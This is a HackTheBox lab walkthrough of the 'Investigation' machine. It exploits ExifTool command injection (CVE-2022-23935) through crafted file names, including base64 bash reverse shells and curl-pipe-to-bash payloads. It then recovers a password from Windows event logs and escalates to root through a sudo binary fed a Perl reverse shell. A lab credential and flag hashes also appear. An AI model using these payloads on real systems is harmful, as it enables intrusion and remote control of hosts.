---
render_with_liquid: false
title: HackTheBox Writeup  Investigation
date: 2023-04-22 05:04:28 +1400
tags: [hackthebox, nmap, linux, forensics, cve-2022-23935, exiftool, pwncat, php, command-injection, event-logs, linpeas, python-uploadserver, extract-msg, decompile-explorer, chainsaw, ghidra, sudo]
---



Investigation is a Linux box rated as medium difficulty, which features a web application that provides a service for digital forensic analysis of image files. The server utilizes the ExifTool utility to analyze the image, however, the version being used has a command injection vulnerability that can be exploited to gain an initial foothold on the box as the user `www-data`. By analyzing logs found in a Windows Event logs file, it is possible to escalate privileges to the user `smorton`. To achieve the final goal of gaining root access, the user must reverse engineer a binary that can be run by the user `smorton` with sudo access and then exploit it to elevate privileges to root.


# Recon
---

## Nmap

```bash

# Nmap 7.93 scan initiated Sat Apr 22 05:04:27 2023 as: nmap -sVC -p- -T4 -Pn -vv -oA investigation 10.10.11.197
Nmap scan report for 10.10.11.197
Host is up, received user-set (0.093s latency).
Scanned at 2023-04-22 05:04:28 EDT for 64s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 2f1e6306aa6ebbcc0d19d4152674c6d9 (RSA)
| ssh-rsa ...
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://eforenzics.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Add to hosts

```bash
echo '10.10.11.197 eforenzics.htb' >> /etc/hosts
```


## 80 - eForenzics - Premier Digital Forensics

![](/assets/obsidian/83fa8da9b05e87f58046f68780c2587d.png)


# User Flag
---

## Image Forensics Service

> `/service.html`

After uploading an image file, it will return an **exiftool** result

![](/assets/obsidian/9963d08dfd114c785221e74743aa7aa9.png)

![](/assets/obsidian/a79a6d96aeb134a1c3dbad6fe11f80db.png)

>http://eforenzics.htb/analysed_images/20220625obdarkschoolboyfitwtiev220480832png.txt

```css
ExifTool Version Number         : 12.37
File Name                       : 2022_06_25_ob---dark-schoolboy-fit-w--tie-v2-20480832.png
Directory                       : .
File Size                       : 1048 bytes
File Modification Date/Time     : 2023:04:22 09:13:02+00:00
File Access Date/Time           : 2023:04:22 09:13:02+00:00
File Inode Change Date/Time     : 2023:04:22 09:13:02+00:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 64
Image Height                    : 64
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Image Size                      : 64x64
Megapixels                      : 0.004
```


## Exploit Exiftool 12.37 (CVE-2022-23935)

![](/assets/obsidian/4d3a7bcea3550006aedd4b9ced3d22e9.png)


### Using Automated POC script

There's already a neat POC
- https://github.com/0xFTW/CVE-2022-23935

```bash
┌──(root㉿kali)-[~/investigation/CVE-2022-23935]
└─# ./CVE-2022-23935.py 10.10.14.45 1111
[+] Connected!!!!

   _____ __      __ ______      ___    ___  ___   ___        ___   ____    ___  ____   _____
  / ____|\ \    / /|  ____|    |__ \  / _ \|__ \ |__ \      |__ \ |___ \  / _ \|___ \ | ____|
 | |      \ \  / / | |__  ______  ) || | | |  ) |   ) |______  ) |  __) || (_) | __) || |__
 | |       \ \/ /  |  __||______|/ / | | | | / /   / /|______|/ /  |__ <  \__, ||__ < |___ \
 | |____    \  /   | |____      / /_ | |_| |/ /_  / /_       / /_  ___) |   / / ___) | ___) |
  \_____|    \/    |______|    |____| \___/|____||____|     |____||____/   /_/ |____/ |____/

                                            by 0xFTW

[+] Trying to bind to :: on port 1111: Done
[+] Waiting for connections on :::1111: Got connection from ::ffff:10.10.11.197 on port 33588
[*] Switching to interactive mode
bash: cannot set terminal process group (962): Inappropriate ioctl for device
bash: no job control in this shell
www-data@investigation:~/uploads/1682155243$ $ cd ~
cd ~
www-data@investigation:~$ $ ls
ls
html
uploads
www-data@investigation:~$ $
```


### Manually

https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429

![](/assets/obsidian/98b27e0c0acafac6f13562dc4e2bfd95.png)

![](/assets/obsidian/cacf48260d063e7daf4acc55556e58ff.png)

Upload the crafted image

```
┌──(root㉿kali)-[/home/kali]
└─# cp 756-536x354.jpg 'ping 10.10.14.45 -c 1 |'
```

It's working

```bash
┌──(root㉿kali)-[~/investigation]
└─# tcpdump -i tun0 'icmp && dst 10.10.14.45'
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
05:40:36.115685 IP eforenzics.htb > 10.10.14.45: ICMP echo request, id 3, seq 1, length 64
05:40:36.115705 IP 10.10.14.45 > eforenzics.htb: ICMP echo reply, id 3, seq 1, length 64
05:40:36.115684 IP eforenzics.htb > 10.10.14.45: ICMP echo request, id 3, seq 1, length 64
```

Try reverse shell

```bash
┌──(root㉿kali)-[/home/kali]
└─# cp dummy.jpg '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.45/1111 0>&1"'
cp: cannot create regular file '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.45/1111 0>&1"': No such file or directory
```
- File name can't contain `/`

Cant host the reverse shell then do `curl 10.10.14.45/rev.sh|bash` either

Could use burp repeater to edit the file name or,

Use base64

```bash
┌──(root㉿kali)-[/home/kali]
└─# echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.45/1111 0>&1"' | base64 -w0
L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDUvMTExMSAwPiYxIgo=

┌──(root㉿kali)-[/home/kali]
└─# cp dummy.png 'echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDUvMTExMSAwPiYxIgo= | base64 -d | bash |'
```

![](/assets/obsidian/9d2e8a0710bd3f598e25de6fa9abf2e1.png)

Got shell

```bash
┌──(root㉿kali)-[~/investigation/www]
└─# pwncat-cs -lp 1111 -m linux
[05:49:32] Welcome to pwncat 🐈!                                                                                                                                                                  __main__.py:164[05:53:07] received connection from 10.10.11.197:51800                                                                                                                                                 bind.py:84[05:53:10] 10.10.11.197:51800: registered new host w/ db                                                                                                                                           manager.py:957(local) pwncat$     
(remote) www-data@investigation:/var/www/uploads/1682157203$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


## Investigate and get windows event log file

get users

```bash
(remote) www-data@investigation:/$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
smorton:x:1000:1000:eForenzics:/home/smorton:/bin/bash
```

Run linpeas

```bash
┌──(root㉿kali)-[/opt/tools/privesc]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.197 - - [22/Apr/2023 06:00:06] "GET /linpeas.sh HTTP/1.1" 200 -
---

(remote) www-data@investigation:/$ curl 10.10.14.45/linpeas.sh|bash
```

![](/assets/obsidian/85b25d4e0e06d3f6da4bbd2bb419780e.png)

Nope

![](/assets/obsidian/14c66343a84988050cbd87b20e65699a.png)

Interesting task

![](/assets/obsidian/078bf9030a6a31a6fd5ee7300a82c157.png)

```bash
*/5 * * * * date >> /usr/local/investigation/analysed_log && echo "Clearing folders" >> /usr/local/investigation/analysed_log && rm -r /var/www/uploads/* && rm /var/www/html/analysed_images/*
```

```bash
(remote) www-data@investigation:/$ cd /usr/local/investigation
(remote) www-data@investigation:/usr/local/investigation$ ls -la
total 1288
drwxr-xr-x  2 root     root        4096 Sep 30  2022  .
drwxr-xr-x 11 root     root        4096 Aug 27  2022  ..
-rw-rw-r--  1 smorton  smorton  1308160 Oct  1  2022 'Windows Event Logs for Analysis.msg'
-rw-rw-r--  1 www-data www-data       0 Oct  1  2022  analysed_log
```

Get the Log file

```bash
┌──(root㉿kali)-[~/investigation/www]
└─# python3 -m uploadserver 80
File upload available at /upload
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
(remote) www-data@investigation:/usr/local/investigation$ curl 10.10.14.45/upload -X POST -F 'files=@"Windows Event Logs for Analysis.msg"'
```

```bash
10.10.11.197 - - [22/Apr/2023 06:29:18] [Uploaded] "Windows Event Logs for Analysis.msg" --> /root/investigation/www/Windows Event Logs for Analysis.msg
10.10.11.197 - - [22/Apr/2023 06:29:18] "POST /upload HTTP/1.1" 204 -
```


## Analyze Windows Event Log

```bash
┌──(root㉿kali)-[~/investigation/www]
└─# file 'Windows Event Logs for Analysis.msg'
Windows Event Logs for Analysis.msg: CDFV2 Microsoft Outlook Message

┌──(root㉿kali)-[~/investigation/www]
└─# pipx install extract-msg
  installed package extract-msg 0.40.0, installed using Python 3.11.2
  These apps are now globally available
    - extract_msg
done! ✨ 🌟 ✨

┌──(root㉿kali)-[~/investigation/www]
└─# extract_msg 'Windows Event Logs for Analysis.msg'

┌──(root㉿kali)-[~/investigation/www/2022-01-15_1930 Windows Event Logs for Analysis]
└─# ls -la
total 1260
drwxr-xr-x 2 root root    4096 Apr 22 07:46 .
drwxr-xr-x 3 root root    4096 Apr 22 07:46 ..
-rw-r--r-- 1 root root 1276591 Apr 22 07:46 evtx-logs.zip
-rw-r--r-- 1 root root     441 Apr 22 07:46 message.txt

┌──(root㉿kali)-[~/investigation/www/2022-01-15_1930 Windows Event Logs for Analysis]
└─# cat message.txt
From: Thomas Jones <thomas.jones@eforenzics.htb>
Sent: Sat, 15 Jan 2022 19:30:29 -0500
To: Steve Morton <steve.morton@eforenzics.htb>
Subject: Windows Event Logs for Analysis
-----------------

Hi Steve,

Can you look through these logs to see if our analysts have been logging on to the inspection terminal. I'm concerned that they are moving data on to production without following our data transfer procedures.

Regards.
Tom
```

```bash
┌──(root㉿kali)-[~/investigation/www/2022-01-15_1930 Windows Event Logs for Analysis]
└─# unzip evtx-logs.zip
Archive:  evtx-logs.zip
  inflating: security.evtx
```


### DeepBlueCLI

John's yt video : [Forensics of Windows Event Logs](https://www.youtube.com/watch?v=G8XjSO_eshc) just pop up today, lets use **DeepBlueCLI**

```bash
PS C:\Users\User\Downloads\DeepBlueCLI> .\DeepBlue.ps1 ..\security.evtx


Date    : 2022/8/2 上午 04:36:28
Log     : Security
EventID : 4673
Message : Sensitive Privilege Use Exceeds Threshold
Results : Potentially indicative of Mimikatz, multiple sensitive privilege calls have been made.
          Username: LJenkins
          Domain Name: EFORENZICS-DI

Command :
Decoded :

Date    : 2022/8/2 上午 04:22:01
Log     : Security
EventID : 4732
Message : User added to local Administrators group
Results : Username: -
          User SID: S-1-5-21-3901137903-2834048592-2457289426-1009

Command :
Decoded :

Date    : 2022/8/2 上午 12:00:21
Log     : Security
EventID : 1102
Message : Audit Log Clear
Results : The Audit log was cleared.
          帳戶名稱:     SMorton
Command :
Decoded :

Date    : 2022/8/2 上午 12:00:21
Log     : Security
EventID : 4672
Message : Multiple admin logons for one account
Results : Username: SMorton
          User SID Access Count: 4
Command :
Decoded :
```


### Password mistype as username

According to Hacktricks
https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/windows-forensics#security

Filter event with code : `4625` which maps `Authentication errorAuthentication error`

Using windows event log

![](/assets/obsidian/809b119e47d8f0dfffcb6f9f539ec106.png)

![](/assets/obsidian/f310fff39eba9f7b3bf7ce82f9a4722c.png)

![](/assets/obsidian/3e39bed4fca521eeb5511cd985339938.png)

Looks like a user mistyped password in username field

```bash
(remote) www-data@investigation:/$ su - smorton
Password:Def@ultf0r3nz!csPa$$

smorton@investigation:~$ id
uid=1000(smorton) gid=1000(smorton) groups=1000(smorton)
smorton@investigation:~$ cat user.txt
5b1053408aaf3792edfd2d95791d22c5
```


# Root Flag
---

```bash
┌──(root㉿kali)-[~/investigation]
└─# ssh smorton@eforenzics.htb
smorton@investigation:~$ sudo -l
Matching Defaults entries for smorton on investigation:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User smorton may run the following commands on investigation:
    (root) NOPASSWD: /usr/bin/binary
smorton@investigation:~$ file /usr/bin/binary
/usr/bin/binary: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a703575c5c944bfcfea8a04f0aabaf0b4fa9f7cb, for GNU/Linux 3.2.0, not stripped
```


## Decompile Explorer

Before starting `ghidra`

Use online [Decompile Explorer](https://dogbolt.org/)

https://dogbolt.org/?id=da95b48c-349c-41f5-b16a-6d45eff7a9cb#Ghidra=531&BinaryNinja=401&angr=1&Hex-Rays=14

```c
int32_t main(int32_t argc, char** argv, char** envp)
{
    if (argc != 3)
    {
        puts("Exiting... ");
        exit(0);
        /* no return */
    }
    if (getuid() != 0)
    {
        puts("Exiting... ");
        exit(0);
        /* no return */
    }
    if (strcmp(argv[2], "lDnxUysaQn") != 0)
    {
        puts("Exiting... ");
        exit(0);
        /* no return */
    }
    puts("Running... ");
    FILE* rax_8 = fopen(argv[2], &data_2027);
    int64_t rax_9 = curl_easy_init();
    int32_t var_40 = 0x2712;
    curl_easy_setopt(rax_9, 0x2712, argv[1], 0x2712);
    int32_t var_3c = 0x2711;
    curl_easy_setopt(rax_9, 0x2711, rax_8, 0x2711);
    int32_t var_38 = 0x2d;
    curl_easy_setopt(rax_9, 0x2d, 1, 0x2d);
    if (curl_easy_perform(rax_9) != 0)
    {
        puts("Exiting... ");
        exit(0);
        /* no return */
    }
    int64_t rax_25 = snprintf(nullptr, 0, &data_202a, argv[2]);
    char* rax_28 = malloc((rax_25 + 1));
    snprintf(rax_28, (rax_25 + 1), &data_202a, argv[2]);
    int64_t rax_37 = snprintf(nullptr, 0, "perl ./%s", rax_28);
    char* rax_40 = malloc((rax_37 + 1));
    snprintf(rax_40, (rax_37 + 1), "perl ./%s", rax_28);
    fclose(rax_8);
    curl_easy_cleanup(rax_9);
    setuid(0);
    system(rax_40);
    system("rm -f ./lDnxUysaQn");
    return 0;
}
```
- Needs 3 args: `file_name`, `param1`, `param2`
- Needs root 
- `param2` ahve to equal to `lDnxUysaQn`

Steps the script will perform:
1. curl resource from `param1`
2. Save the curl result to file with name: `param2`
3. Execute the downloaded file with **perl**
4. Finally, remove the file `./lDnxUysaQn`

Generate perl reverse shell with https://www.revshells.com/

```bash
┌──(root㉿kali)-[~/investigation/www]
└─# echo 'use Socket;$i="10.10.14.45";$p=1111;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};' >> rev.pl

┌──(root㉿kali)-[~/investigation/www]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

On target machine

```bash
smorton@investigation:~$ sudo /usr/bin/binary 10.10.14.45/rev.pl 'lDnxUysaQn'
Running...
```

Listener

```bash
┌──(root㉿kali)-[~/investigation/www]
└─# pwncat-cs -lp 1111 -m linux
[10:57:22] Welcome to pwncat 🐈!                                                                                                                                                                  __main__.py:164[10:57:35] received connection from 10.10.11.197:34032                                                                                                                                                 bind.py:84[10:57:38] 10.10.11.197:34032: registered new host w/ db                                                                                                                                                                                                                                                                  manager.py:957(local) pwncat$
(remote) root@investigation:/home/smorton#
(remote) root@investigation:/home/smorton# id
uid=0(root) gid=0(root) groups=0(root)
(remote) root@investigation:/home/smorton# cd ~
(remote) root@investigation:/root# cat root.txt
328daf503a56809950e0996d1f12ae66
(remote) root@investigation:/root#
```

![](/assets/obsidian/2f5af8d2f5dcb998fb5ae1d66f2930fa.png)


# Additional
---

## Ippsec

> https://www.youtube.com/watch?v=X5hVEuWmehk


### Exploit Exiftool 12.37

Since `/` is a bad character, save the reverse shell to `index.html` then pipe to bash to avoid using paths

```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.45/1111 0>&1' > index.html
python3 -m http.server 80
```

**Filename Payload**

```bash
curl 10.10.14.45 | bash |
```


### Chainsaw - Forensic Windows Event Log

- https://github.com/WithSecureLabs/chainsaw

> Similar to DeepBlueCLI

Demo: 
![](/assets/obsidian/6e1cb5d9e8ded0dfbca56a7fd1a972d3.png)

```bash
┌──(root㉿kali)-[~/investigation]
└─# wget https://github.com/WithSecureLabs/chainsaw/releases/download/v2.6.0/chainsaw_all_platforms+rules+examples.zip
```

```bash
┌──(root㉿kali)-[~/investigation/chainsaw]
└─# mkdir investigation

┌──(root㉿kali)-[~/investigation/chainsaw]
└─# mv ../security.evtx investigation

┌──(root㉿kali)-[~/investigation/chainsaw]
└─# ./chainsaw_x86_64-unknown-linux-gnu hunt ./investigation -r rules
```

![](/assets/obsidian/cbb8b4bd9336e74d3fa13a501495da1f.png)

Dump success and failed logins to json, event ids : `4624`, `4625`

```bash
┌──(root㉿kali)-[~/investigation/chainsaw]
└─# ./chainsaw_x86_64-unknown-linux-gnu search -t 'Event.System.EventID: =4624' ./investigation -j -o success_logins.json
...
[+] Found 91 hits

┌──(root㉿kali)-[~/investigation/chainsaw]
└─# ./chainsaw_x86_64-unknown-linux-gnu search -t 'Event.System.EventID: =4625' ./investigation -j -o unsuccess_logins.json
...
[+] Found 3 hits
```

Analyze the logs

```bash
┌──(root㉿kali)-[~/investigation/chainsaw]
└─# ipython3
Python 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0]
Type 'copyright', 'credits' or 'license' for more information
IPython 8.5.0 -- An enhanced Interactive Python. Type '?' for help.

In [1]: import json

In [2]: with open('success_logins.json', 'r') as f:
   ...:     s = json.load(f)
   ...:

In [3]: with open('unsuccess_logins.json', 'r') as f:
   ...:     f = json.load(f)
   ...:

In [4]: s
...
```

Filter some values

```python
print("\n".join(["|\t|".join([v for k,v in event['Event']['EventData'].items() if k in {'LogonProcessName', 'ProcessName', 'SubjectUserName', 'TargetUserName'}]) for event in s]))
```

Nothing interesting in success logins

![](/assets/obsidian/31e433debf75450c89b75f9fa2a234c9.png)

Filter failed logins

```python
print("\n".join(["|\t|".join([v for k,v in event['Event']['EventData'].items() if k in {'LogonProcessName', 'ProcessName', 'SubjectUserName', 'TargetUserName'}]) for event in f]))
```

Found it

![](/assets/obsidian/8691d1761f4de941d44db358ceb9d8ca.png)


### Ghidra

Rename and retype variables to make code more readable

**Ex:**
- Retype `long` -> `char**`
- Rename param -> `argc` (arg count), `argv` (arg value)

![](/assets/obsidian/487aaafa99f9311fc4b0af785c4fa835.png)